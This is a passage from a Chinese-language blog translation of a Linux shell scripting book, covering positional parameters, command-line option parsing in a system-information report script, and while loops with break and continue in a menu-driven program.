class="line"><span class="variable">$3</span> =</span><br><span class="line"><span class="variable">$4</span> = </span><br></pre></td></tr></table></figure>

<p>使用我们的参数，<code>$* 和 $</code>@ 都产生了四个单词的结果。</p>
<blockquote>
<p>word words with spaces</p>
<p>“$*“ 产生一个单词结果：”word words with spaces”</p>
<p>“$@” 产生两个单词结果：”word” “words with spaces”</p>
</blockquote>
<p>这符合我们的实际意图。从中吸取的教训是，尽管 shell 提供了四种不同的获取位置参数列表的方式，但 “$@” 在大多数情况下是最有用的，因为它保留了每个位置参数的完整性。为了确保安全，应该始终使用它，除非我们有充分的理由不使用它。</p>
<h3 id="更完整的应用"><a href="#更完整的应用" class="headerlink" title="更完整的应用"></a>更完整的应用</h3><p>经过长时间的休息，我们将继续我们的 sys_info_page 程序的工作，最后一次在第27章中见到。我们接下来的添加将为程序添加几个命令行选项，如下所示：</p>
<ul>
<li><p><strong>输出文件。</strong> 我们将添加一个选项来指定包含程序输出的文件名。它将被指定为 -f <em>file</em> 或 –file <em>file</em>。</p>
</li>
<li><p><strong>交互模式。</strong> 此选项将提示用户输入输出文件名，并确定指定的文件是否已存在。如果存在，用户将在现有文件被覆盖之前被提示。此选项将通过 -i 或 –interactive 来指定。</p>
</li>
<li><p><strong>帮助。</strong> 可以指定 -h 或 –help 以使程序输出一个信息性的使用消息。</p>
</li>
</ul>
<p>这是实现命令行处理所需的代码：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">usage</span></span> () &#123;</span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$PROGNAME</span>: 用法: <span class="variable">$PROGNAME</span> [-f file | -i]&quot;</span></span><br><span class="line">  <span class="built_in">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 处理命令行选项</span></span><br><span class="line">interactive=</span><br><span class="line">filename=</span><br><span class="line"><span class="keyword">while</span> [[ -n <span class="string">&quot;<span class="variable">$1</span>&quot;</span> ]]; <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">case</span> <span class="string">&quot;<span class="variable">$1</span>&quot;</span> <span class="keyword">in</span></span><br><span class="line">    -</span><br><span class="line"></span><br><span class="line">f | --file) <span class="built_in">shift</span></span><br><span class="line">      filename=<span class="string">&quot;<span class="variable">$1</span>&quot;</span></span><br><span class="line">      ;;</span><br><span class="line">    -i | --interactive) interactive=1</span><br><span class="line">	    ;;</span><br><span class="line">    -h | --<span class="built_in">help</span>) usage</span><br><span class="line">  	  <span class="built_in">exit</span></span><br><span class="line">    	;;</span><br><span class="line">    *) usage &gt;&amp;2</span><br><span class="line">	    <span class="built_in">exit</span> 1</span><br><span class="line">  	  ;;</span><br><span class="line">  <span class="keyword">esac</span></span><br><span class="line">  <span class="built_in">shift</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p>首先，我们添加了一个名为 usage 的 shell 函数，用于在调用帮助选项或尝试未知选项时显示消息。</p>
<p>接下来，我们开始处理循环。这个循环在位置参数 $1 不为空时继续。循环结束时，我们有一个 shift 命令来推进位置参数以确保循环最终终止。</p>
<p>循环内部，我们有一个 case 语句，用于检查当前位置参数是否匹配任何支持的选项。如果找到支持的参数，则对其进行操作。如果找到未知选项，则显示使用消息并脚本以错误终止。</p>
<p>-f 参数以有趣的方式处理。当检测到时，它会导致额外的 shift 发生，将位置参数 $1 前进到 -f 选项提供的文件名参数。</p>
<p>接下来，我们添加代码以实现交互模式。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 交互模式</span></span><br><span class="line"><span class="keyword">if</span> [[ -n <span class="string">&quot;<span class="variable">$interactive</span>&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">  <span class="keyword">while</span> <span class="literal">true</span>; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">read</span> -p <span class="string">&quot;输入输出文件名: &quot;</span> filename</span><br><span class="line">    <span class="keyword">if</span> [[ -e <span class="string">&quot;<span class="variable">$filename</span>&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">      <span class="built_in">read</span> -p <span class="string">&quot;&#x27;<span class="variable">$filename</span>&#x27; 已存在。覆盖吗？[y/n/q] &gt; &quot;</span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&quot;<span class="variable">$REPLY</span>&quot;</span> <span class="keyword">in</span></span><br><span class="line">        Y|y) <span class="built_in">break</span></span><br><span class="line">          ;;</span><br><span class="line">        Q|q) <span class="built_in">echo</span> <span class="string">&quot;程序已终止。&quot;</span></span><br><span class="line">          <span class="built_in">exit</span></span><br><span class="line">          ;;</span><br><span class="line">        *) <span class="built_in">continue</span></span><br><span class="line">	        ;;</span><br><span class="line">      <span class="keyword">esac</span></span><br><span class="line">    <span class="keyword">elif</span> [[ -z <span class="string">&quot;<span class="variable">$filename</span>&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">  	  <span class="built_in">continue</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">	    <span class="built_in">break</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">  <span class="keyword">done</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>

<p>如果 interactive 变量不为空，则启动一个无限循环，该循环包含文件名提示和后续现有文件处理代码。如果所需的输出文件已经存在，将提示用户覆盖、选择另一个文件名或退出程序。如果用户选择覆盖现有文件，则执行 break 以终止循环。注意 casestatement 只检测用户是否选择覆盖或退出。任何其他选择都会导致循环继续并再次提示用户。</p>
<p>要实现输出文件名功能，我们首先必须将现有页面编写代码转换为 shell 函数，原因稍后会变得清楚。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">write_html_page</span></span> () &#123;</span><br><span class="line"><span class="built_in">cat</span> &lt;&lt;- <span class="string">_EOF_</span></span><br><span class="line"><span class="string">  &lt;html&gt;</span></span><br><span class="line"><span class="string">    &lt;head&gt;</span></span><br><span class="line"><span class="string">      &lt;title&gt;$TITLE&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;/head&gt;</span></span><br><span class="line"><span class="string">    &lt;body&gt;</span></span><br><span class="line"><span class="string">      &lt;h1&gt;$TITLE&lt;/h1&gt;</span></span><br><span class="line"><span class="string">      &lt;p&gt;$TIMESTAMP&lt;/p&gt;</span></span><br><span class="line"><span class="string">      $(report_uptime)</span></span><br><span class="line"><span class="string">      $(report_disk_space)</span></span><br><span class="line"><span class="string">      $(report_home_space)</span></span><br><span class="line"><span class="string">    &lt;/body&gt;</span></span><br><span class="line"><span class="string">  &lt;/html&gt;</span></span><br><span class="line"><span class="string">  _EOF_</span></span><br><span class="line">  <span class="built_in">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 输出 html 页面</span></span><br><span class="line"><span class="keyword">if</span> [[ -n <span class="string">&quot;<span class="variable">$filename</span>&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">  <span class="keyword">if</span> <span class="built_in">touch</span> <span class="string">&quot;<span class="variable">$filename</span>&quot;</span> &amp;&amp; [[ -f <span class="string">&quot;<span class="variable">$filename</span>&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">    write_html_page &gt; <span class="string">&quot;<span class="variable">$filename</span>&quot;</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$PROGNAME</span>: 无法写入文件 &#x27;<span class="variable">$filename</span>&#x27;&quot;</span> &gt;&amp;2</span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	write_html_page</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>

<p>处理 -f 选项逻辑的代码出现在上一个列表的末尾。在其中，我们测试是否存在文件名，如果找到，则执行测试以查看文件是否确实可写。为此，执行 touch，然后测试以确定结果文件是否为常规文件。这两个测试处理了输入无效路径名的情况（touch 将失败），并且，如果文件已存在，则它是常规文件。</p>
<p>正如我们所见，write_html_page 函数被调用来实际生成页面。其输出要么被定向到标准输出（如果变量 filename 为空），要么被重定向到指定的文件。由于我们有两个可能的 HTML 代码目的地，将 write_html_page 例程转换为 shell 函数以避免重复代码是有意义的。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>有了位置参数的添加，我们现在可以编写相当功能性的脚本。对于简单</p>
<p>的重复任务，位置参数使得编写非常有用的 shell 函数成为可能，这些函数可以放置在用户的 .bashrc 文件中。</p>
<p>我们的 sys_info_page 程序在复杂性和精细度上有所增长。这里是一个完整的列表，最近的更改被突出显示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># sys_info_page: 程序输出系统信息页面</span></span><br><span class="line">PROGNAME=<span class="string">&quot;<span class="subst">$(basename <span class="string">&quot;<span class="variable">$0</span>&quot;</span>)</span>&quot;</span></span><br><span class="line">TITLE=<span class="string">&quot;系统信息报告 <span class="variable">$HOSTNAME</span>&quot;</span></span><br><span class="line">CURRENT_TIME=<span class="string">&quot;<span class="subst">$(date +<span class="string">&quot;%x %r %Z&quot;</span>)</span>&quot;</span></span><br><span class="line">TIMESTAMP=<span class="string">&quot;生成 <span class="variable">$CURRENT_TIME</span>，由 <span class="variable">$USER</span>&quot;</span></span><br><span class="line"><span class="function"><span class="title">report_uptime</span></span> () &#123;</span><br><span class="line">  <span class="built_in">cat</span> &lt;&lt;- <span class="string">_EOF_</span></span><br><span class="line"><span class="string">    &lt;h2&gt;系统正常运行时间&lt;/h2&gt;</span></span><br><span class="line"><span class="string">    &lt;pre&gt;$(uptime)&lt;/pre&gt;</span></span><br><span class="line"><span class="string">    _EOF_</span></span><br><span class="line">  <span class="built_in">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="title">report_disk_space</span></span> () &#123;</span><br><span class="line">  <span class="built_in">cat</span> &lt;&lt;- <span class="string">_EOF_</span></span><br><span class="line"><span class="string">    &lt;h2&gt;磁盘空间利用率&lt;/h2&gt;</span></span><br><span class="line"><span class="string">    &lt;pre&gt;$(df -h)&lt;/pre&gt;</span></span><br><span class="line"><span class="string">    _EOF_</span></span><br><span class="line">  <span class="built_in">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="title">report_home_space</span></span> () &#123;</span><br><span class="line">  <span class="keyword">if</span> [[ <span class="string">&quot;<span class="subst">$(id -u)</span>&quot;</span> -eq 0 ]]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">cat</span> &lt;&lt;- <span class="string">_EOF_</span></span><br><span class="line"><span class="string">      &lt;h2&gt;家目录空间利用率（所有用户）&lt;/h2&gt;</span></span><br><span class="line"><span class="string">      &lt;pre&gt;$(du -sh /home/*)&lt;/pre&gt;</span></span><br><span class="line"><span class="string">      _EOF_</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">cat</span> &lt;&lt;- <span class="string">_EOF_</span></span><br><span class="line"><span class="string">      &lt;h2&gt;家目录空间利用率 ($USER)&lt;/h2&gt;</span></span><br><span class="line"><span class="string">      &lt;pre&gt;$(du -sh &quot;$HOME&quot;)&lt;/pre&gt;</span></span><br><span class="line"><span class="string">      _EOF_</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line">  <span class="built_in">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="title">usage</span></span> () &#123;</span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$PROGNAME</span>: 用法: <span class="variable">$PROGNAME</span> [-f file | -i]&quot;</span></span><br><span class="line">  <span class="built_in">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="title">write_html_page</span></span> () &#123;</span><br><span class="line">  <span class="built_in">cat</span> &lt;&lt;- <span class="string">_EOF_</span></span><br><span class="line"><span class="string">  &lt;html&gt;</span></span><br><span class="line"><span class="string">    &lt;head&gt;</span></span><br><span class="line"><span class="string">    	&lt;title&gt;$TITLE&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;/head&gt;</span></span><br><span class="line"><span class="string">    &lt;body&gt;</span></span><br><span class="line"><span class="string">      &lt;h1&gt;$TITLE&lt;/h1&gt;</span></span><br><span class="line"><span class="string">      &lt;p&gt;$TIMESTAMP&lt;/p&gt;</span></span><br><span class="line"><span class="string">      $(report_uptime)</span></span><br><span class="line"><span class="string">      $(report_disk_space)</span></span><br><span class="line"><span class="string">      $(report_home_space)</span></span><br><span class="line"><span class="string">    &lt;/body&gt;</span></span><br><span class="line"><span class="string">  &lt;/html&gt;</span></span><br><span class="line"><span class="string">  _EOF_</span></span><br><span class="line">  <span class="built_in">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 处理命令行选项</span></span><br><span class="line">interactive=</span><br><span class="line">filename=</span><br><span class="line"><span class="keyword">while</span> [[ -n <span class="string">&quot;<span class="variable">$1</span>&quot;</span> ]]; <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">case</span> <span class="string">&quot;<span class="variable">$1</span>&quot;</span> <span class="keyword">in</span></span><br><span class="line">    -f | --file) <span class="built_in">shift</span></span><br><span class="line">      filename=<span class="string">&quot;<span class="variable">$1</span>&quot;</span></span><br><span class="line">      ;;</span><br><span class="line">    -i | --interactive) interactive=1</span><br><span class="line">	    ;;</span><br><span class="line">    -h | --<span class="built_in">help</span>) usage</span><br><span class="line">  	  <span class="built_in">exit</span></span><br><span class="line">    	;;</span><br><span class="line">    *) usage &gt;&amp;2</span><br><span class="line">	    <span class="built_in">exit</span> 1</span><br><span class="line">  	  ;;</span><br><span class="line">  <span class="keyword">esac</span></span><br><span class="line">  <span class="built_in">shift</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 交互模式</span></span><br><span class="line"><span class="keyword">if</span> [[ -n <span class="string">&quot;<span class="variable">$interactive</span>&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">  <span class="keyword">while</span> <span class="literal">true</span>; <span class="keyword">do</span></span><br><span class="line">  	<span class="built_in">read</span> -p <span class="string">&quot;输入输出文件名: &quot;</span> filename</span><br><span class="line">  	<span class="keyword">if</span> [[ -e <span class="string">&quot;<span class="variable">$filename</span>&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">      <span class="built_in">read</span> -p <span class="string">&quot;&#x27;<span class="variable">$filename</span>&#x27; 已存在。覆盖吗？[y/n/q] &gt; &quot;</span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&quot;<span class="variable">$REPLY</span>&quot;</span> <span class="keyword">in</span></span><br><span class="line">        Y|y) <span class="built_in">break</span></span><br><span class="line">        ;;</span><br><span class="line">      Q|q) <span class="built_in">echo</span> <span class="string">&quot;程序已终止。&quot;</span></span><br><span class="line">        <span class="built_in">exit</span></span><br><span class="line">        ;;</span><br><span class="line">      *) <span class="built_in">continue</span></span><br><span class="line">     	 ;;</span><br><span class="line">    	<span class="keyword">esac</span></span><br><span class="line">    <span class="keyword">elif</span> [[ -z <span class="string">&quot;<span class="variable">$filename</span>&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">  	  <span class="built_in">continue</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">	    <span class="built_in">break</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">  <span class="keyword">done</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出 html 页面</span></span><br><span class="line"><span class="keyword">if</span> [[ -n <span class="string">&quot;<span class="variable">$filename</span>&quot;</span> ]]; <span class="keyword">then</span> </span><br><span class="line">  <span class="keyword">if</span> <span class="built_in">touch</span> <span class="string">&quot;<span class="variable">$filename</span>&quot;</span> &amp;&amp; [[ -f <span class="string">&quot;<span class="variable">$filename</span>&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">    write_html_page &gt; <span class="string">&quot;<span class="variable">$filename</span>&quot;</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$PROGNAME</span>: 无法写入文件 &#x27;<span class="variable">$filename</span>&#x27;&quot;</span> &gt;&amp;2</span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	write_html_page</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>

<p>我们还没有完成。还有一些我们可以做的事情和我们可以做的改进。</p>
<h3 id="进一步阅读"><a href="#进一步阅读" class="headerlink" title="进一步阅读"></a>进一步阅读</h3><ul>
<li><p><em>Bash 黑客 Wiki</em> 上有关于位置参数的好文章：<span class="exturl" data-url="aHR0cDovL3dpa2kuYmFzaC1oYWNrZXJzLm9yZy9zY3JpcHRpbmcvcG9zcGFyYW1z">http://wiki.bash-hackers.org/scripting/posparams<i class="fa fa-external-link-alt"></i></span></p>
</li>
<li><p><em>Bash 参考手册</em>中有关特殊参数的文章，包括 <code>$* 和 $</code>@：<span class="exturl" data-url="aHR0cDovL3d3dy5nbnUub3JnL3NvZnR3YXJlL2Jhc2gvbWFudWFsL2Jhc2hyZWYuaHRtbCNTcGVjaWFsLVBhcmFtZXRlcnM=">http://www.gnu.org/software/bash/manual/bashref.html#Special-Parameters<i class="fa fa-external-link-alt"></i></span></p>
</li>
<li><p>除了本章讨论的技术外，bash 还包含了一个名为 getopts 的内置命令，也可以用于处理命令行参数。它在 bash man 页面的 SHELL BUILTIN COMMANDS 部分以及 <em>Bash 黑客 Wiki</em> 上有描述：<span class="exturl" data-url="aHR0cDovL3dpa2kuYmFzaC1oYWNrZXJzLm9yZy9ob3d0by9nZXRvcHRzX3R1dG9yaWFs">http://wiki.bash-hackers.org/howto/getopts_tutorial<i class="fa fa-external-link-alt"></i></span></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>TLCL</tag>
      </tags>
  </entry>
  <entry>
    <title>流控制：使用while / until循环</title>
    <url>/2024/05/29-flow-control-looping/</url>
    <content><![CDATA[<h2 id="29-–-流控制：使用while-until循环"><a href="#29-–-流控制：使用while-until循环" class="headerlink" title="29 – 流控制：使用while &#x2F; until循环"></a>29 – 流控制：使用while &#x2F; until循环</h2><p>在上一章中，我们开发了一个菜单驱动的程序来生成各种系统信息。程序可以工作，但它仍然有一个重大的可用性问题。它只执行单个选择然后终止。更糟糕的是，如果做出了无效选择，程序会在没有给用户重新尝试的机会的情况下带着错误终止。如果我们能以某种方式构建程序，使其能够一次又一次地重复菜单显示和选择，直到用户选择退出程序，那会更好。</p>
<p>在这一章中，我们将研究一个称为<em>循环</em>的编程概念，它可以用来使程序的某些部分重复。Shell提供了三个用于循环的复合命令。我们将在本章中查看其中的两个，第三个将在后面的章节中查看。</p>
<span id="more"></span>

<h3 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h3><p>日常生活中充满了重复的活动。每天去工作，遛狗和切萝卜都是涉及重复一系列步骤的任务。让我们考虑切萝卜。如果我们用伪代码表达这个活动，它可能看起来像这样：</p>
<ol>
<li>拿切菜板</li>
<li>拿刀</li>
<li>把萝卜放在切菜板上</li>
<li>举起刀</li>
<li>推进萝卜</li>
<li>切萝卜</li>
<li>如果整个萝卜切完了，那么退出；否则回到第4步</li>
</ol>
<p>第4步到第7步形成一个<em>循环</em>。循环内的动作重复，直到达到“整个萝卜切片”这个条件为止。</p>
<h4 id="while"><a href="#while" class="headerlink" title="while"></a>while</h4><p>bash可以表达类似的想法。假设我们想要顺序显示从1到5的五个数字。一个bash脚本可以这样构建：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># while-count: 显示一系列数字</span></span><br><span class="line">count=1</span><br><span class="line"><span class="keyword">while</span> [[ <span class="string">&quot;<span class="variable">$count</span>&quot;</span> -le 5 ]]; <span class="keyword">do</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$count</span>&quot;</span></span><br><span class="line">	count=$((count + <span class="number">1</span>))</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;完成。&quot;</span></span><br></pre></td></tr></table></figure>

<p>执行此脚本时，将显示以下内容：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ while-count</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">完成。</span><br></pre></td></tr></table></figure>

<p>while命令的语法如下：</p>
<blockquote>
<p>while <em>commands</em>; do <em>commands</em>; done</p>
</blockquote>
<p>像if一样，while评估一系列命令的退出状态。只要退出状态为零，它就执行循环内的命令。在前面的脚本中，变量count被创建并赋予了初始值1。while命令评估[[]]复合命令的退出状态。只要[[]]命令返回一个退出状态为零，循环内的命令就会被执行。在每个周期结束时，[[]]命令会被重复。经过五次循环迭代后，count的值增加到6，[[]]命令不再返回退出状态为零，循环终止。程序继续执行循环后的下一个语句。</p>
<p>我们可以使用<em>while循环</em>来改进上一章的read-menu程序。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># while-menu: 一个菜单驱动的系统信息程序</span></span><br><span class="line">DELAY=3 <span class="comment"># 显示结果的秒数</span></span><br><span class="line"><span class="keyword">while</span> [[ <span class="string">&quot;<span class="variable">$REPLY</span>&quot;</span> != 0 ]]; <span class="keyword">do</span></span><br><span class="line">  clear</span><br><span class="line">  <span class="built_in">cat</span> &lt;&lt;- <span class="string">_EOF_</span></span><br><span class="line"><span class="string">    请选择：</span></span><br><span class="line"><span class="string">    1. 显示系统信息</span></span><br><span class="line"><span class="string">    2. 显示磁盘空间</span></span><br><span class="line"><span class="string">    3. 显示家目录空间利用率</span></span><br><span class="line"><span class="string">    0. 退出</span></span><br><span class="line"><span class="string">  _EOF_</span></span><br><span class="line">  <span class="built_in">read</span> -p <span class="string">&quot;输入选择 [0-3] &gt; &quot;</span></span><br><span class="line">  <span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$REPLY</span>&quot;</span> =~ ^[0-3]$ ]]; <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">if</span> [[ <span class="variable">$REPLY</span> == 1 ]]; <span class="keyword">then</span></span><br><span class="line">      <span class="built_in">echo</span></span><br><span class="line"></span><br><span class="line"> <span class="string">&quot;主机名: <span class="variable">$HOSTNAME</span>&quot;</span></span><br><span class="line">      <span class="built_in">uptime</span></span><br><span class="line">      <span class="built_in">sleep</span> <span class="string">&quot;<span class="variable">$DELAY</span>&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$REPLY</span>&quot;</span> == 2 ]]; <span class="keyword">then</span></span><br><span class="line">      <span class="built_in">df</span> -h</span><br><span class="line">      <span class="built_in">sleep</span> <span class="string">&quot;<span class="variable">$DELAY</span>&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$REPLY</span>&quot;</span> == 3 ]]; <span class="keyword">then</span></span><br><span class="line">      <span class="keyword">if</span> [[ <span class="string">&quot;<span class="subst">$(id -u)</span>&quot;</span> -eq 0 ]]; <span class="keyword">then</span></span><br><span class="line">      	<span class="built_in">echo</span> <span class="string">&quot;家目录空间利用率（所有用户）&quot;</span></span><br><span class="line">      	<span class="built_in">du</span> -sh /home/*</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;家目录空间利用率（<span class="variable">$USER</span>）&quot;</span></span><br><span class="line">        <span class="built_in">du</span> -sh <span class="string">&quot;<span class="variable">$HOME</span>&quot;</span></span><br><span class="line">      <span class="keyword">fi</span></span><br><span class="line">    	<span class="built_in">sleep</span> <span class="string">&quot;<span class="variable">$DELAY</span>&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;无效输入。&quot;</span></span><br><span class="line">    <span class="built_in">sleep</span> <span class="string">&quot;<span class="variable">$DELAY</span>&quot;</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;程序终止。&quot;</span></span><br></pre></td></tr></table></figure>

<p>通过将菜单包含在一个while循环中，我们能够让程序在每次选择后重复菜单显示。只要REPLY不等于0，循环就会继续，并且菜单将被重新显示，给用户机会进行另一次选择。在每个操作结束后，执行sleep命令，以便程序暂停几秒钟，允许在清屏并重新显示菜单之前看到选择的结果。一旦REPLY等于0，表示选择了“退出”，循环终止，执行继续进行到done之后的行。</p>
<h3 id="退出循环"><a href="#退出循环" class="headerlink" title="退出循环"></a>退出循环</h3><p>bash提供了两个内置命令，可以用来在循环内控制程序流。break命令立即终止循环，程序控制继续执行循环后的下一个语句。continue命令导致循环的其余部分被跳过，程序控制继续执行循环的下一次迭代。这里我们看到一个版本的while-menu程序，结合了break和continue：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># while-menu2: 一个菜单驱动的系统信息程序</span></span><br><span class="line">DELAY=3 <span class="comment"># 显示结果的秒数</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span>; <span class="keyword">do</span></span><br><span class="line">  clear</span><br><span class="line">  <span class="built_in">cat</span> &lt;&lt;- <span class="string">_EOF_</span></span><br><span class="line"><span class="string">  	请选择：</span></span><br><span class="line"><span class="string">    1. 显示系统信息</span></span><br><span class="line"><span class="string">    2. 显示磁盘空间</span></span><br><span class="line"><span class="string">    3. 显示家目录空间利用率</span></span><br><span class="line"><span class="string">    0. 退出</span></span><br><span class="line"><span class="string">  _EOF_</span></span><br><span class="line">  <span class="built_in">read</span> -p <span class="string">&quot;输入选择 [0-3] &gt; &quot;</span></span><br><span class="line">  <span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$REPLY</span>&quot;</span> =~ ^[0-3]$ ]]; <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$REPLY</span>&quot;</span> == 1 ]]; <span class="keyword">then</span></span><br><span class="line">      <span class="built_in">echo</span> <span class="string">&quot;主机名: <span class="variable">$HOSTNAME</span>&quot;</span></span><br><span class="line">      <span class="built_in">uptime</span></span><br><span class="line">      <span class="built_in">sleep</span> <span class="string">&quot;<span class="variable">$DELAY</span>&quot;</span></span><br><span class="line">      <span class="built_in">continue</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$REPLY</span>&quot;</span> == 2 ]]; <span class="keyword">then</span></span><br><span class="line">      <span class="built_in">df</span> -h</span><br><span class="line">      <span class="built_in">sleep</span> <span class="string">&quot;<span class="variable">$DELAY</span>&quot;</span></span><br><span class="line">      <span class="built_in">continue</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$REPLY</span>&quot;</span> == 3 ]]; <span class="keyword">then</span></span><br><span class="line">      <span class="keyword">if</span> [[ <span class="string">&quot;<span class="subst">$(id -u)</span>&quot;</span> -eq 0 ]]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;家目录空间利用率（所有用户）&quot;</span></span><br><span class="line">        <span class="built_in">du</span> -sh /home/*</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;家目录空间利用率（<span class="variable">$USER</span>）&quot;</span></span><br><span class="line">        <span class="built_in">du</span> -sh <span class="string">&quot;<span class="variable">$HOME</span>&quot;</span></span><br><span class="line">      <span class="keyword">fi</span></span><br><span class="line">      <span class="built_in">sleep</span> <span class="string">&quot;<span class="variable">$DELAY</span>&quot;</span></span><br><span class="line">      <span class="built_in">continue</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$REPLY</span>&quot;</span> == 0 ]]; <span class="keyword">then</span></span><br><span class="line">    	<span class="built_in">break</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;无效输入。&quot;</span></span><br><span class="line">    <span class="built_in">sleep</span> <span class="string">&quot;<span class="variable">$DELAY</span>&quot;</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;程序终止。&quot;</span></span><br></pre></td></tr></table></figure>

<p>在这个版本的脚本中，我们通过使用true命令为while提供退出状态来设置一个<em>无限循环</em>（永远不会自行终止的循环）。由于true总是以退出状态为零退出，循环永远不会结束。这是一个令人惊讶的常见脚本技巧。由于循环永远不会自行结束，因此程序员有责任在合适的时候提供某种方式来跳出循环。在这个脚本中，当选择0时使用break命令退出循环。在其他脚本选择的末尾包含了continue命令，以允许更有效的执行。通过使用continue，脚本将跳过不需要的代码。例如，如果选择了1并被识别，那么测试其他选择的原因就</p>
<p>没有了。</p>
